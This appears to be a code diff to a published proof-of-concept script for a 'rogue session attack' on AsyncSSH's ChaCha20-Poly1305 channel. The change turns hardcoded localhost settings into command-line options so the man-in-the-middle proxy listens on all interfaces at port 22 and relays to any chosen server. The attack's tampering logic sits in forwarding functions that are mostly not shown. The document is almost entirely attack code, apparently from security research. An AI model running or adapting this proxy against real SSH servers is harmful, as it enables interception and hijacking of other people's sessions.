@@ -1,8 +1,10 @@
 #!/usr/bin/python3
+from binascii import unhexlify
 import socket
 from threading import Thread
-from binascii import unhexlify
 from time import sleep
+
+import click
 
 ##################################################################################
 ## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
@@ -15,13 +17,33 @@ from time import sleep
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
 ##################################################################################
 
-# IP and port for the TCP proxy to bind to
-PROXY_IP = '127.0.0.1'
-PROXY_PORT = 2222
+@click.command()
+@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
+@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
+@click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
+@click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
+def cli(proxy_ip, proxy_port, server_ip, server_port):
+    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
+    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    mitm_socket.bind((proxy_ip, proxy_port))
+    mitm_socket.listen(5)
 
-# IP and port of the server
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 22
+    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...")
+
+    try:
+        while True:
+            client_socket, client_addr = mitm_socket.accept()
+            print(f"[+] Accepted connection from: {client_addr}")
+            print(f"[+] Establishing new server connection to {(server_ip, server_port)}.")
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.connect((server_ip, server_port))
+            print("[+] Spawning new forwarding threads to handle client connection.")
+            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
+            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
+    except KeyboardInterrupt:
+        client_socket.close()
+        server_socket.close()
+        mitm_socket.close()
 
 # Length of the individual messages
 NEW_KEYS_LENGTH = 16
@@ -80,24 +102,4 @@ def forward_server_to_client(client_socket, server_socket):
     server_socket.close()
 
 if __name__ == '__main__':
-    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
-    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    mitm_socket.bind((PROXY_IP, PROXY_PORT))
-    mitm_socket.listen(5)
-
-    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
-
-    try:
-        while True:
-            client_socket, client_addr = mitm_socket.accept()
-            print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
-            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.connect((SERVER_IP, SERVER_PORT))
-            print("[+] Spawning new forwarding threads to handle client connection.")
-            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
-            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
-    except KeyboardInterrupt:
-        client_socket.close()
-        server_socket.close()
-        mitm_socket.close()
+    cli()
